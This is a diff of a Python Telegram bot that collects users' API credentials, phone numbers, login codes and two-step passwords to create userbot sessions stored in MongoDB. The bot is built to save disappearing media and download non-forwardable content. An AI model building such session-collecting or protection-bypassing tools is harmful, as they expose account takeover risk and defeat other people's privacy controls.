@@ -1,5 +1,3 @@
-# bot.py
-
 import os
 import asyncio
 import logging
@@ -7,7 +5,10 @@ from datetime import datetime
 from motor.motor_asyncio import AsyncIOMotorClient
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
-from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError, ChannelPrivateError
+from telethon.errors import (
+    SessionPasswordNeededError, PhoneCodeInvalidError,
+    PhoneCodeExpiredError, ChannelPrivateError
+)
 from telegram import (
     Update, InlineKeyboardButton, InlineKeyboardMarkup,
     ReplyKeyboardMarkup, KeyboardButton
@@ -18,7 +19,6 @@ from telegram.ext import (
 )
 from dotenv import load_dotenv
 
-# Load environment variables
 load_dotenv()
 DEFAULT_API_ID = int(os.getenv("API_ID"))
 DEFAULT_API_HASH = os.getenv("API_HASH")
@@ -30,21 +30,21 @@ ADMIN_ID = int(os.getenv("ADMIN_ID", "7755789304"))
 WELCOME_IMAGE = "https://graph.org/file/d367814bc3243e72917ab-9f1d63e7b3f46b6716.jpg"
 SUPPORT_LINK = "https://t.me/valahallah"
 
-# Logging
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
 logger = logging.getLogger("UserBot")
 
-# MongoDB setup
 mongo_client = AsyncIOMotorClient(MONGO_URI)
 db = mongo_client.userbot
 sessions = db.sessions
 
-# Telegram Bot App
 app = ApplicationBuilder().token(BOT_TOKEN).build()
 API_ID, API_HASH, PHONE, CODE, PASSWORD, FETCH_LINK = range(6)
 user_login_data = {}
 
-# --- START ---
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("❌ All process cancelled. Now send /start again.")
+    return ConversationHandler.END
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     inline_keyboard = InlineKeyboardMarkup([
         [InlineKeyboardButton("🔐 Connect Your Account", callback_data="connect")],
@@ -55,13 +55,13 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         resize_keyboard=True
     )
     welcome_text = (
-        "<b>✨ 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝘼𝙪𝙩𝙤𝙎𝙖𝙫𝙚 𝙐𝙨𝙚𝙧𝘽𝙤𝙩 ✨</b>\n\n"
-        "🔒 <i>This bot helps you connect your own Telegram account to a secure userbot session.</i>\n\n"
-        "💡 <b>Features:</b>\n"
-        "• Auto-saves disappearing media 🔥\n"
-        "• Secure Telethon login system 🔐\n"
-        "• Works in the background without touching your main device 🛰️\n\n"
-        "👇 Use the buttons below to begin."
+        "<b>✨ Welcome to AutoSave UserBot ✨</b>\n\n"
+        "🔐 <i>Securely connect your Telegram account to generate a powerful userbot session.</i>\n\n"
+        "<b>⚙️ Features:</b>\n"
+        "• Save disappearing media from private chats automatically 📦\n"
+        "• Download non-forwardable content from groups & channels 🔓\n"
+        "• Background processing without needing your main phone 📲\n\n"
+        "👇 Click the button below to get started!"
     )
     await update.message.reply_photo(
         photo=WELCOME_IMAGE,
@@ -73,18 +73,20 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "☝️ Use the menu below to fetch non-forwardable media.",
         reply_markup=reply_keyboard
     )
-
-# --- Connect Callback ---
 async def connect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.callback_query.message:
         await update.callback_query.answer()
-        await update.callback_query.message.reply_text("📲 Enter your API ID or send /skip to use default:")
+        await update.callback_query.message.reply_text(
+            "📲 <b>Enter your API ID</b> or send /skip to use default\n\n"
+            "💡 <i>Example:</i> <code>1234567</code>\n"
+            "ℹ️ You can cancel anytime by sending /cancel",
+            parse_mode="HTML"
+        )
         return API_ID
     else:
         await update.callback_query.answer("⚠️ This button is expired. Use /start again.", show_alert=True)
         return ConversationHandler.END
 
-# --- API ID/HASH Flow ---
 async def skip_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_login_data[update.effective_user.id] = {"api_id": DEFAULT_API_ID}
     await update.message.reply_text("🔑 Enter your API HASH or send /skip to use default:")
@@ -114,7 +116,6 @@ async def get_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("📞 Enter your phone number (with country code):")
     return PHONE
 
-# --- Phone/OTP/Password ---
 async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_login_data[update.effective_user.id]["phone"] = update.message.text.strip()
     try:
@@ -127,7 +128,7 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await client.send_code_request(user_login_data[update.effective_user.id]["phone"])
         user_login_data[update.effective_user.id]["client"] = client
         await update.message.reply_text(
-            "🔐 Enter the OTP you received with **spaces**, like:\n\n<code>1 2 3 4 5</code>",
+            "🔐 Enter the OTP you received with <b>spaces</b>, like:\n\n<code>1 2 3 4 5</code>\n\nSend /cancel to stop anytime.",
             parse_mode="HTML"
         )
         return CODE
@@ -163,8 +164,6 @@ async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         await update.message.reply_text(f"❌ Failed to sign in: {e}")
         return ConversationHandler.END
-
-# --- Login Complete ---
 async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     client = user_login_data[user_id]["client"]
@@ -218,7 +217,6 @@ async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("✅ Successfully connected your account!")
     return ConversationHandler.END
 
-# --- Fetch Media ---
 async def menu_fetch_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "📎 Send the message link from a channel/group you're joined in:\n\n"
@@ -264,8 +262,7 @@ async def fetch_from_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         await update.message.reply_text(f"❌ Error: {e}")
     return ConversationHandler.END
-
-# --- Handlers ---
+    # --- Handlers ---
 login_conv = ConversationHandler(
     entry_points=[CallbackQueryHandler(connect_callback, pattern="connect")],
     states={
@@ -275,7 +272,7 @@ login_conv = ConversationHandler(
         CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_otp)],
         PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
     },
-    fallbacks=[],
+    fallbacks=[CommandHandler("cancel", cancel)],
     allow_reentry=True
 )
 
@@ -283,12 +280,15 @@ fetch_menu_conv = ConversationHandler(
     entry_points=[
         MessageHandler(filters.TEXT & filters.Regex("(?i).*Download Non-Forwardable Media.*"), menu_fetch_request)
     ],
-    states={FETCH_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, fetch_from_link)]},
-    fallbacks=[],
+    states={
+        FETCH_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, fetch_from_link)]
+    },
+    fallbacks=[CommandHandler("cancel", cancel)],
 )
 
 # --- Add & Run ---
 app.add_handler(CommandHandler("start", start))
+app.add_handler(CommandHandler("cancel", cancel))
 app.add_handler(login_conv)
 app.add_handler(fetch_menu_conv)
 
